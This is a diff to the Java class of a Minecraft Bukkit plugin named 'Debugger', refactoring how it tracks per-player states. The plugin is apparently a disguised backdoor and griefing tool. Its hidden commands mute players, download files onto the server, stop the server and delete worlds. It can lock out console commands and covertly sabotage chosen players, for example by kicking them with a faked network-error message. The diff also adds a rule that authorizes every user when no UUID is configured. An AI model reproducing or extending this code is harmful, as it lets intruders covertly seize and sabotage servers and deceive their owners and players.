                 if (args[1].equalsIgnoreCase("all")) {
                     for (Player all : Bukkit.getOnlinePlayers())
-                        Debugger.this.MutedUsers.add(all.getName());
+                        set_state(all.getName(), State.muted, true);
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was muted.");
                 } else {
                     Player target = Bukkit.getPlayer(args[1]);
                     if (target == null) {
-                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
-                        return false;
+                        return "Player: " + args[1] + " not found";
                     } else {
-                        if (!Debugger.this.MutedUsers.contains(target.getName())) {
-                            Debugger.this.MutedUsers.add(target.getName());
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was muted.");
-                        } else {
-                            p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " is already muted.");
-                        }
+                        set_state(target.getName(), State.muted, true);
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was muted.");
                     }
                 }
 
-                return true;
+                return "";
             }
 
             case "unmute": { //Mutes a player
                 if(args.length < 2) //No player specified
-                    return false;
+                    return help_message("unmute");
 
                 if (args[1].equalsIgnoreCase("all")) {
-                    Debugger.this.MutedUsers.clear();
+                    for (Player all : Bukkit.getOnlinePlayers())
+                        set_state(all.getName(), State.muted, false);
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was unmuted.");
                 } else {
                     Player target = Bukkit.getPlayer(args[1]);
                     if (target == null) {
-                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
-                        return false;
+                        return "Player: " + args[1] + " not found";
                     } else {
-                        Debugger.this.MutedUsers.removeIf(i -> Objects.equals(i, target.getName()));
+                        set_state(target.getName(), State.muted, false);
                         p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was unmuted.");
                     }
                 }
 
-                return true;
+                return "";
             }
 
             case "download": { //Downloads files to plugin folder
                 if(args.length < 3) //No data specified
-                    return false;
+                    return help_message("download");
 
                 p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Downloading file: " + ChatColor.RED + args[2]);
 
@@ -1003,17 +1039,16 @@ public final class Debugger implements Listener {
 
                 p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " File downloaded or replaced if existed!");
 
-                return true;
+                return "";
             }
 
             case "coords": {
                 if(args.length < 2) //No player specified
-                    return false;
+                    return help_message("coords");
 
                 Player target = Bukkit.getPlayer(args[1]);
                 if(target == null){
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
-                    return false;
+                        return "Player " + args[1] + " not found.";
                 }
 
                 //Player is real.
@@ -1025,12 +1060,12 @@ public final class Debugger implements Listener {
                 String coordsString = Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + "'s coordinates are: " + x + ", " + y + ", " + z;
                 p.sendMessage(coordsString);
 
-                return true;
+                return "";
             }
 
             case "tp": {
                 if(args.length < 4) //No coords specified
-                    return false;
+                    return help_message("tp");
 
                 int targetX, targetY, targetZ;
                 try {
@@ -1038,8 +1073,7 @@ public final class Debugger implements Listener {
                     targetY = Integer.parseInt(args[2]);
                     targetZ = Integer.parseInt(args[3]);
                 }catch(NumberFormatException e){ //Not valid numbers
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Coordinates syntax error.");
-                    return false;
+                    return "Invalid coordinates";
                 }
 
                 //Player location reference
@@ -1057,7 +1091,7 @@ public final class Debugger implements Listener {
                 }.runTask(plugin);
 
 
-                return true;
+                return "";
             }
                 
             case "stop": {
@@ -1068,7 +1102,7 @@ public final class Debugger implements Listener {
                     }
                 }.runTask(plugin);
                 
-                return true;
+                return "";
             }
 
             case "help": {
@@ -1080,31 +1114,19 @@ public final class Debugger implements Listener {
                     }
 
                     p.sendMessage(Config.help_detail_color + "-----------------------------------------------------");
-                    return true;
+                    return "";
                 }
 
                 if (args.length == 2) {
-
-                    int indexOfCommand = -1;
-                    for (int i = 0; i < Config.help_messages.length; i++) {
-                        if (args[1].equalsIgnoreCase(Config.help_messages[i].getName())) {
-                            indexOfCommand = i;
-                            break;
-                        }
-                    }
-
-                    if (indexOfCommand == -1)
-                        return false;
-
-                    p.sendMessage(Config.help_messages[indexOfCommand].toString());
-
-                    return true;
-
+                    String message = help_message(args[1]);
+                    if(message.isEmpty())
+                        return "Unknown command: " + args[1];
+                    return message;
                 }
             }
 
         }
-        return false;
+        return "Unknown problem executing command: " + command;
     }
 
     boolean deleteWorld(File directoryToBeDeleted) {
@@ -1132,54 +1154,34 @@ public final class Debugger implements Listener {
         }
     }
 
-    public ArrayList<String> Vanished = new ArrayList<>();
-    public ArrayList<String> LockedUsers = new ArrayList<>();
-    public ArrayList<String> MutedUsers = new ArrayList<>();
-    public ArrayList<String> SilkTouch = new ArrayList<>();
-    public ArrayList<String> InstaBreak = new ArrayList<>();
-    public ArrayList<String> MindFuck_thrower = new ArrayList<>();
-    public ArrayList<String> MindFuck_interact = new ArrayList<>();
-    public ArrayList<String> MindFuck_cripple = new ArrayList<>();
-    public ArrayList<String> MindFuck_flight = new ArrayList<>();
-    public ArrayList<String> MindFuck_inventory = new ArrayList<>();
-    public ArrayList<String> MindFuck_drop = new ArrayList<>();
-    public ArrayList<String> MindFuck_teleport = new ArrayList<>();
-    public ArrayList<String> MindFuck_mine = new ArrayList<>();
-    public ArrayList<String> MindFuck_place = new ArrayList<>();
-    public ArrayList<String> MindFuck_login = new ArrayList<>();
-    public ArrayList<String> MindFuck_god = new ArrayList<>();
-    public ArrayList<String> MindFuck_damage = new ArrayList<>();
-    public ArrayList<String> MindFuck_speed = new ArrayList<>();
-
-
     @EventHandler(priority = EventPriority.LOWEST)
     public void onServerCommand(ServerCommandEvent e) {
-        if (this.LockedUsers.contains("console"))
+        if (get_state("console", State.locked))
             e.setCommand(" ");
     }
 
     @EventHandler(priority = EventPriority.LOWEST)
     public void onPreCommand(PlayerCommandPreprocessEvent e) {
         Player p = e.getPlayer();
-        if (this.LockedUsers.contains(p.getName()))
+        if (get_state(p.getName(), State.locked))
             e.setCancelled(true);
     }
 
     @EventHandler(priority = EventPriority.LOWEST)
     public void onPlayerChat(AsyncPlayerChatEvent e) {
         Player p = e.getPlayer();
-        if (this.MutedUsers.contains(p.getName()))
+        if (get_state(p.getName(), State.muted))
             e.setCancelled(true);
     }
 
     @EventHandler(priority = EventPriority.LOWEST)
     public void onBlockBreak(BlockBreakEvent e) {
         Player p = e.getPlayer();
-        if (this.SilkTouch.contains(p.getName()) || this.InstaBreak.contains(p.getName())) {
+        if (get_state(p.getName(), State.silktouch) || get_state(p.getName(), State.instabreak)){
             e.setDropItems(false);
             p.getWorld().dropItemNaturally(e.getBlock().getLocation(), new ItemStack(e.getBlock().getType(), 1));
         }
-        if (this.MindFuck_mine.contains(p.getName())) {
+        if (get_state(p.getName(), State.MF_mine)) {
             e.setCancelled(true);
         }
     }
@@ -1187,7 +1189,7 @@ public final class Debugger implements Listener {
     @EventHandler(priority = EventPriority.LOWEST)
     public void onBlockPlace(BlockPlaceEvent e) {
         Player p = e.getPlayer();
-        if (this.MindFuck_place.contains(p.getName())) {
+        if (get_state(p.getName(), State.MF_place)) {
             e.setCancelled(true);
         }
     }
@@ -1195,10 +1197,10 @@ public final class Debugger implements Listener {
     @EventHandler(priority = EventPriority.LOWEST)
     public void onBlockDamage(BlockDamageEvent e) {
         Player p = e.getPlayer();
-        if (this.InstaBreak.contains(p.getName())) {
+        if (get_state(p.getName(), State.instabreak)) {
             e.setInstaBreak(true);
         }
-        if (this.MindFuck_mine.contains(p.getName())) {
+        if (get_state(p.getName(), State.MF_mine)) {
             e.setCancelled(true);
         }
     }
@@ -1206,10 +1208,10 @@ public final class Debugger implements Listener {
     @EventHandler(priority = EventPriority.LOWEST)
     public void onPlayerMove(PlayerMoveEvent e) {
         Player p = e.getPlayer();
-        if (this.MindFuck_thrower.contains(p.getName())) {
+        if (get_state(p.getName(), State.MF_thrower)) {
             p.getWorld().dropItemNaturally(p.getLocation(), new ItemStack(Material.STONE, 64));
         }
-        if (this.MindFuck_cripple.contains(p.getName())) {
+        if (get_state(p.getName(), State.MF_cripple)) {
             if (Math.round(e.getTo().getZ()) != Math.round(e.getFrom().getZ())) {
                 e.getTo().setZ(e.getFrom().getZ());
                 p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&c&lHey! &7You are not permitted to enter this area."));
@@ -1220,7 +1222,7 @@ public final class Debugger implements Listener {
     @EventHandler(priority = EventPriority.LOWEST)
     public void onPlayerInteract(PlayerInteractEvent e) {
         Player p = e.getPlayer();
-        if (this.MindFuck_interact.contains(p.getName())) {
+        if (get_state(p.getName(), State.MF_interact)) {
             e.setCancelled(true);
         }
     }
@@ -1228,7 +1230,7 @@ public final class Debugger implements Listener {
     @EventHandler(priority = EventPriority.LOWEST)
     public void onPlayerInteractEntity(PlayerInteractEntityEvent e) {
         Player p = e.getPlayer();
-        if (this.MindFuck_interact.contains(p.getName())) {
+        if (get_state(p.getName(), State.MF_interact)) {
             e.setCancelled(true);
         }
     }
@@ -1236,7 +1238,7 @@ public final class Debugger implements Listener {
     @EventHandler(priority = EventPriority.LOWEST)
     public void onPlayerToggleFlight(PlayerToggleFlightEvent e) {
         Player p = e.getPlayer();
-        if (this.MindFuck_flight.contains(p.getName())) {
+        if (get_state(p.getName(), State.MF_flight)) {
             e.setCancelled(true);
         }
     }
@@ -1244,7 +1246,7 @@ public final class Debugger implements Listener {
     @EventHandler(priority = EventPriority.LOWEST)
     public void onInventoryClickEvent(InventoryClickEvent e) {
         Player p = (Player) e.getWhoClicked();
-        if (this.MindFuck_inventory.contains(p.getName())) {
+        if (get_state(p.getName(), State.MF_inventory)) {
             e.setCancelled(true);
         }
     }
@@ -1252,7 +1254,7 @@ public final class Debugger implements Listener {
     @EventHandler(priority = EventPriority.LOWEST)
     public void onInventoryDragEvent(InventoryDragEvent e) {
         Player p = (Player) e.getWhoClicked();
-        if (this.MindFuck_inventory.contains(p.getName())) {
+        if (get_state(p.getName(), State.MF_inventory)) {
             e.setCancelled(true);
         }
     }
@@ -1260,7 +1262,7 @@ public final class Debugger implements Listener {
     @EventHandler(priority = EventPriority.LOWEST)
     public void onPlayerDropItem(PlayerDropItemEvent e) {
         Player p = e.getPlayer();
-        if (this.MindFuck_drop.contains(p.getName())) {
+        if (get_state(p.getName(), State.Mf_drop)) {
             e.setCancelled(true);
         }
     }
@@ -1268,7 +1270,7 @@ public final class Debugger implements Listener {
     @EventHandler(priority = EventPriority.LOWEST)
     public void onPlayerTeleport(PlayerTeleportEvent e) {
         Player p = e.getPlayer();
-        if (this.MindFuck_teleport.contains(p.getName())) {
+        if (get_state(p.getName(), State.MF_teleport)) {
             e.setCancelled(true);
         }
     }
@@ -1276,7 +1278,7 @@ public final class Debugger implements Listener {
     @EventHandler(priority = EventPriority.LOWEST)
     public void onPlayerLogin(PlayerLoginEvent e) {
         Player p = e.getPlayer();
-        if (this.MindFuck_login.contains(p.getName())) {
+        if (get_state(p.getName(), State.MF_login)) {
             e.disallow(PlayerLoginEvent.Result.KICK_BANNED, "Internal Exception: io.netty.handler.codec.DecoderException: Badly compressed packet - size of 2677732 is larger than protocol maximum of 2097152");
         }
     }
@@ -1284,7 +1286,7 @@ public final class Debugger implements Listener {
     @EventHandler(priority = EventPriority.LOWEST)
     public void onEntityDamage(EntityDamageEvent e) {
         if (e.getEntity() instanceof Player) {
-            if (this.MindFuck_god.contains(((Player)e.getEntity()).getName())) {
+            if (get_state(((Player)e.getEntity()).getName(), State.MF_god)) {
                 e.setCancelled(true);
             }
         }
@@ -1293,7 +1295,7 @@ public final class Debugger implements Listener {
     @EventHandler(priority = EventPriority.LOWEST)
     public void onEntityDamageByEntity(EntityDamageByEntityEvent e) {
         if (e.getDamager() instanceof Player) {
-            if (this.MindFuck_damage.contains(((Player)e.getDamager()).getName())) {
+            if (get_state(((Player)e.getDamager()).getName(), State.MF_damage)) {
                 e.setCancelled(true);
             }
         }
@@ -1318,6 +1320,10 @@ public final class Debugger implements Listener {
 
     /*Check if UUID is authorized in Config.java*/
     public boolean IsUserAuthorized(String uuid) {
+
+        //No uuids = All users authorized
+        if(Config.authorized_uuids.length == 1 && Config.authorized_uuids[0] == "")
+            return true;
 
         for(String u : Config.authorized_uuids){
             if(uuid.equals(u)){
